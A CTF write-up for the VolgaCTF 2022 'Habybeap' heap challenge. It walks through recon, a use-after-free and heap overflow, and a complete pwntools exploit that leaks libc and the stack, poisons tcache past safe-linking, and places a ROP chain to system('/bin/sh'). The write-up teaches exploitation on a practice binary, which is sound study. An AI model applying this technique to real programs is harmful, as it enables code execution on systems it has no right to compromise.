* TOC
{:toc}

# VolgaCTF 2022, Habybeap | Thomas Spencer

> This is a basic heap challenge. Flag is in /task/flag.txt.

> `pwn`

> `nc habybeap.q.2022.volgactf.ru 21337`

> [Download Archived Binary](/assets/binaries/habybeap)

# Disclaimer

This is a post-ctf solve. Though I wasn't able to solve it during the CTF, I also couldn't find any other writeups for it, so I took it upon myself to solve and make a writeup about it! Do notice, I am going to solve this challenge with an up to date libc (glibc version 2.35), rather than the one provided (glibc version 2.33), for no particular reason.

# Recon

As usual, we should take some preliminary looks at the file we're dealing with before we try taking a crack at breaking it. At a bear minimum, I like to check the output of the `file` and the `checksec` command.

## File

```
./habybeap: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=80229a4ca90ab308fc40ca6d5c7d3515b92fe564, for GNU/Linux 3.2.0, not stripped
```

So this is a standard 64 bit binary, nothing weird happening with static linking. We can also see that the binary is *not* stripped, so we have debug symbols, which will make the reversing phase a lot easier 😁.

## Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

* NX means no easy shellcode injection into the binary.

* PIE is rough, we may have to leak an address in the binary.

* RELRO also means we can't corrupt the GOT.

* However, there are **no stack canaries detected!** This could be useful to hijack control flow!

These lead me to believe that unless there's a way to abuse the logic of the program, we're probably going to have to rely on good old ROP to get remote code execution (probably through ret2libc).

# Functions

## main

* Takes in user input, gives 4 options

    1. Add Note

        * Calls `add_note` function

    2. Edit Note

        * Calls `edit_note` function

    3. Delete Note

        * Calls `delete_note` function

    4. Print Note

        * Calls `print_note` function

    5) Exit

        * Exits the main loop, causing the program to end.

    * Out of range ends the program

## add_note

* Takes in user index

    * Checks to make sure that it is not greater than `0xf`

        * Does not check for negative values...
    
    * Also checks if there is an allocation at the index!

        * Do note, in the `delete_note` function, when an allocation is free'd, it does **NOT** clear out the array index.

* Asks the user if they want a big or smol allocation

    * big = `0x79`

    * smol = `0x68`

    * In both cases, `memset` is used to zero out the memory

        * `memset` clears out the memory region only!

* Reads in user input, `0x78` in size, regardless of the allocation size

    * **Overflow in heap!**

![image](https://user-images.githubusercontent.com/71113694/224215521-c883032c-e748-4289-91e9-c24a6ef38137.png)

## edit_note

* Takes in an index

    * Again only checks if the value is greater than `0xf`

* Allows us to write data to that location

    * Only 6 bytes though :/

    * Not enough for a double free, but enough to corrupt the next pointer slightly

![image](https://user-images.githubusercontent.com/71113694/224215255-b4247a16-5e9a-4f24-b60d-270d49b09a5a.png)

## delete_note

* Frees a note at an index

    * Only checks that the input value is greater than 0!

* **IMPORTANT NOTE:** This function does not clear out the address within the pointers buffer. This is a double edged sword, since we can have some easy UAF's using these free'd pointers, but since the `add_note` function checks if the spot in the allocation is free, we can only make a total of **16** allocations.

![image](https://user-images.githubusercontent.com/71113694/224216062-6971dbe2-5c14-4fd7-8324-8360700cd110.png)

*Notice, IDA didn't give the correct decompilation, so I had to look at the assembly view!*

## print_note

* Prints out the contents of a note using a simple `puts` call.

# Vulnerabilites

* Obvious UAF bug, where we have read and write permissions

    * Issue of only 6 bytes being writable

    * Not too much of a concern because of Little Endian, and most of the addresses we're concerned with should fit into 6 bytes :)

* Overflow in the heap, possible method to leak contents of a freed bin

    * Caused from the `add_note` function! Potential read and write opportunities?

# Exploit

* Use the UAF to get a LIBC leak

* Use Libc leak to get a read of the `environ` value in libc

    * This will have a pointer to the stack!

* Use the stack leak to get an allocation at the `main` saved `RIP` location, and put a ROP payload there

    * We can make a ret2libc (specifically to `system`) with all the information we've gathered!

* Choose the exit loop option in `main` to detonate our payload and get a shell B)


# Final Script

```python
#!/bin/env python3
from pwn import *

# CONFIG
DEBUG     = False
FILE 	  = "./habybeap"
LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6"

context.arch 	  = "amd64"
context.encoding  = "latin"
context.log_level = "debug" if (DEBUG) else "info"

warnings.simplefilter("ignore")


# CONSTANTS
AREANA_TO_LIBC_OFFSET = 0x219ce0
ENVIRON_TO_RIP_OFFSET = 0x120

# GLOBALS
elf = ELF(FILE)
rop = ROP(FILE)

libc 	= ELF(LIBC_PATH)
libcROP = ROP(LIBC_PATH)

p = process([FILE])

FREE_INDEX = 0


if (DEBUG):
	input(f"Attach to {p.pid} now!")


def choice(index):
	p.sendlineafter(b'Input your choice>> ', str(index).encode())


def addNote(big, data):
	global FREE_INDEX
	choice(1)
	p.sendlineafter(b'Input your index>> ', str(FREE_INDEX).encode())
	p.sendlineafter(b'for smol >> ', b'1' if (big) else b'0')
	p.sendafter(b'Input your data>> ', data)
	FREE_INDEX += 1


def editNote(index, data):
	if (len(data) > 6):
		data = data[:6]
	
	choice(2)
	p.sendlineafter(b'Input your index>> ', str(index).encode())
	p.sendafter(b'Input your data>> ', data)


def deleteNote(index):
	choice(3)
	p.sendlineafter(b'Input your index>> ', str(index).encode())
		

def printNote(index, convert=True):
	choice(4)
	p.sendlineafter(b'Input your index>> ', str(index).encode())
	output = p.recvline(keepends=False)
	return int.from_bytes(output, "little") if (convert) else output
	

def decryptSafeLinking(encryptedAddr):
	key = 0
	plain = 0

	for i in range(6):
		bits = max(64 - (12 * i), 0)
		plain = ((encryptedAddr ^ key) >> bits) << bits
		key = plain >> 12
	
	return plain


### Get LIBC main areana leak ###
loopCount = 9
for _ in range(loopCount):
	addNote(True, b'Smol')


for i in range(loopCount):
	deleteNote(i)


for i in range(loopCount):
	areana_leak = printNote(i)


# Note at index 7 should now point to the libc main areana
areana_leak = printNote(7)
libc.address += areana_leak - AREANA_TO_LIBC_OFFSET

addNote(False, b'Smol')
addNote(False, b'Smol')

deleteNote(FREE_INDEX - 1)
deleteNote(FREE_INDEX - 2)

# Get an encrypted pointer leak while we're here :)
heapLeak = printNote(FREE_INDEX - 2)
decHeapLeak = decryptSafeLinking(heapLeak)
key = heapLeak ^ decHeapLeak

######################
# We want to leak the environ value. HOWEVER, the add_note function will clear out the memory within the allocated area
# Therefore, we want to allocate at a minimum 0x70 before environ! Fortunately, this lines up to end in 0x0 in the address
# So we don't have to worry about alignment issues with malloc :).
######################
allocAddr = libc.symbols["environ"]
allocOffset = 0x70
allocAddr -= allocOffset

# Change the next pointer to point to 0x70 before environ (encrypted of course)
editNote(FREE_INDEX - 2, p64(allocAddr ^ key))

# We want to have a BIG note with 0x70 bytes of random data so we can print out the environ value
payload = b'A'*0x70
addNote(False, b'\n')
addNote(False, payload)

# Get the environ leak with print_note
# This will give us a stack address!
choice(4)
p.sendlineafter(b'Input your index>> ', str(FREE_INDEX - 1).encode())
p.recvuntil(payload)
environLeak = int.from_bytes(p.recv(6), "little")

# Get another key leak to get up to date key!
heapLeak = printNote(6)
decHeapLeak = decryptSafeLinking(heapLeak)
key = heapLeak ^ decHeapLeak

# We want to allocate a block at the saved RIP address of main
stackWriteLoc = environLeak - ENVIRON_TO_RIP_OFFSET 
stackOffset = stackWriteLoc & 0xf
stackWriteLoc -= stackOffset

# Point the next pointer at the saved main RIP address
editNote(6, p64(stackWriteLoc ^ key))
addNote(True, b'\n')

# Create ROP payload
# This will simply give us a shell
binsh = next(libc.search(b"/bin/sh\x00"))

payload  = b'A'*stackOffset
payload += p64(libc.address + libcROP.find_gadget(["pop rdi", "ret"])[0])
payload += p64(binsh)
payload += p64(libc.address + libcROP.find_gadget(["ret"])[0])
payload += p64(libc.symbols["system"])

# Place ROP payload at main saved RIP 
addNote(True, payload)

# Exit the program to detonate our ROP payload
choice(5)

# Should now have a shell!
log.debug(f"{hex(environLeak)=}")
log.debug(f"{hex(areana_leak)=}")
log.debug(f"{hex(libc.address)=}")
log.debug(f"{hex(libc.symbols['environ'])=}")
log.debug(f"{hex(key)=}")
log.debug(f"{hex(libc.symbols['environ'] ^ key)=}")

log.success("Enjoy your shell :)")
p.interactive()

p.close()
```
